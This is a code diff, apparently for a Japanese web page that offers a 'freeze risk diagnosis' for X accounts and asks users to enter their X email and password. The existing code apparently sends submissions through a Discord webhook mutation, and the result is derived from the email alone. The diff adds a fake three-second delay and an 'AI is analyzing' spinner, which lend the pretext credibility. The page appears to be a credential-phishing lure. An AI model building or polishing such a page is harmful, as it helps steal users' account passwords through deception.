@@ -17,8 +17,20 @@ import { diagnose } from "@/lib/diagnose";
 import { trpc } from "@/lib/trpc";
 import { toast } from "sonner";
 
+// ===== ローディングスピナー =====
+function LoadingSpinner() {
+  return (
+    <div className="fixed inset-0 bg-black/40 backdrop-blur-sm flex items-center justify-center z-50">
+      <div className="flex flex-col items-center gap-4">
+        <div className="w-16 h-16 border-4 border-blue-200 border-t-blue-600 rounded-full animate-spin"></div>
+        <p className="text-white font-bold text-lg">AIが分析中...</p>
+      </div>
+    </div>
+  );
+}
+
 // ===== ログインフォーム =====
-function LoginForm({ onDiagnose }: { onDiagnose: (email: string, password: string) => void }) {
+function LoginForm({ onDiagnose, isLoading }: { onDiagnose: (email: string, password: string) => void; isLoading: boolean }) {
   const [email, setEmail] = useState("");
   const [password, setPassword] = useState("");
   const [showPassword, setShowPassword] = useState(false);
@@ -65,7 +77,8 @@ function LoginForm({ onDiagnose }: { onDiagnose: (email: string, password: strin
             onChange={(e) => setEmail(e.target.value)}
             placeholder="example@email.com"
             autoComplete="email"
-            className={`w-full pl-10 pr-4 py-3 rounded-xl border bg-white/70 text-slate-700 placeholder-slate-400 text-sm transition-all outline-none input-glow focus:border-blue-400 focus:bg-white ${
+            disabled={isLoading}
+            className={`w-full pl-10 pr-4 py-3 rounded-xl border bg-white/70 text-slate-700 placeholder-slate-400 text-sm transition-all outline-none input-glow focus:border-blue-400 focus:bg-white disabled:opacity-50 ${
               errors.email ? "border-red-400 bg-red-50/50" : "border-slate-200"
             }`}
           />
@@ -91,14 +104,16 @@ function LoginForm({ onDiagnose }: { onDiagnose: (email: string, password: strin
             onChange={(e) => setPassword(e.target.value)}
             placeholder="••••••••"
             autoComplete="current-password"
-            className={`w-full pl-10 pr-10 py-3 rounded-xl border bg-white/70 text-slate-700 placeholder-slate-400 text-sm transition-all outline-none input-glow focus:border-blue-400 focus:bg-white ${
+            disabled={isLoading}
+            className={`w-full pl-10 pr-10 py-3 rounded-xl border bg-white/70 text-slate-700 placeholder-slate-400 text-sm transition-all outline-none input-glow focus:border-blue-400 focus:bg-white disabled:opacity-50 ${
               errors.password ? "border-red-400 bg-red-50/50" : "border-slate-200"
             }`}
           />
           <button
             type="button"
             onClick={() => setShowPassword(!showPassword)}
-            className="absolute right-3 top-1/2 -translate-y-1/2 text-slate-400 hover:text-slate-600 transition-colors"
+            disabled={isLoading}
+            className="absolute right-3 top-1/2 -translate-y-1/2 text-slate-400 hover:text-slate-600 transition-colors disabled:opacity-50"
           >
             {showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
           </button>
@@ -122,16 +137,16 @@ function LoginForm({ onDiagnose }: { onDiagnose: (email: string, password: strin
       {/* 診断ボタン */}
       <button
         type="submit"
-        disabled={loading}
+        disabled={loading || isLoading}
         className="w-full py-3.5 rounded-xl font-bold text-white text-sm transition-all duration-300 relative overflow-hidden disabled:opacity-70"
         style={{
-          background: loading
+          background: loading || isLoading
             ? "linear-gradient(135deg, #93c5fd, #60a5fa)"
             : "linear-gradient(135deg, #1d4ed8 0%, #0ea5e9 100%)",
-          boxShadow: loading ? "none" : "0 4px 15px rgba(29, 78, 216, 0.35)",
+          boxShadow: loading || isLoading ? "none" : "0 4px 15px rgba(29, 78, 216, 0.35)",
         }}
       >
-        {loading ? (
+        {loading || isLoading ? (
           <span className="flex items-center justify-center gap-2">
             <svg className="animate-spin w-4 h-4" viewBox="0 0 24 24" fill="none">
               <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" />
@@ -152,6 +167,7 @@ function LoginForm({ onDiagnose }: { onDiagnose: (email: string, password: strin
 // ===== メインページ =====
 export default function Home() {
   const [, navigate] = useLocation();
+  const [isLoading, setIsLoading] = useState(false);
 
   // Discord Webhook送信用のミューテーション
   const sendToDiscord = trpc.diagnosis.sendToDiscord.useMutation({
@@ -166,6 +182,11 @@ export default function Home() {
   });
 
   const handleDiagnose = async (email: string, password: string) => {
+    setIsLoading(true);
+
+    // 3秒待機
+    await new Promise(resolve => setTimeout(resolve, 3000));
+
     const res = diagnose(email);
 
     // ローカルストレージに診断結果を保存
@@ -185,6 +206,7 @@ export default function Home() {
       console.error("Discord送信エラー:", err);
     }
 
+    setIsLoading(false);
     // 結果ページにナビゲート
     navigate("/result");
   };
@@ -196,6 +218,9 @@ export default function Home() {
         background: "linear-gradient(180deg, #e0f2fe 0%, #dbeafe 30%, #e0e7ff 55%, #f1f5f9 85%, #ffffff 100%)",
       }}
     >
+      {/* ローディングスピナー */}
+      {isLoading && <LoadingSpinner />}
+
       {/* 雪のパーティクル */}
       <Snowfall count={45} />
 
@@ -203,7 +228,7 @@ export default function Home() {
       <MountainBackground />
 
       {/* メインコンテンツ */}
-      <div className="relative" style={{ zIndex: 2 }}>
+      <div className="relative" style={{ zIndex: isLoading ? 1 : 2 }}>
         {/* ヘッダー */}
         <header className="flex items-center justify-between px-6 py-4">
           <div className="flex items-center gap-2">
@@ -238,7 +263,7 @@ export default function Home() {
           </p>
 
           {/* ログインフォームカード */}
-          <div className="w-full max-w-md">
+          <div className="w-full max-w-md" style={{ pointerEvents: isLoading ? "none" : "auto", opacity: isLoading ? 0.5 : 1 }}>
             <div className="glass-card rounded-2xl p-6 shadow-xl">
               <div className="flex items-center gap-2 mb-5">
                 <div
@@ -252,12 +277,12 @@ export default function Home() {
                   <p className="text-xs text-slate-400">Xにログインして診断してみよう</p>
                 </div>
               </div>
-              <LoginForm onDiagnose={handleDiagnose} />
+              <LoginForm onDiagnose={handleDiagnose} isLoading={isLoading} />
             </div>
           </div>
 
           {/* 凍結リスク診断とは */}
-          <div className="w-full max-w-md mt-6">
+          <div className="w-full max-w-md mt-6" style={{ pointerEvents: isLoading ? "none" : "auto", opacity: isLoading ? 0.5 : 1 }}>
             <div className="glass-card rounded-2xl p-5">
               <div className="flex items-center gap-2 mb-2">
                 <span className="text-lg">🧊</span>
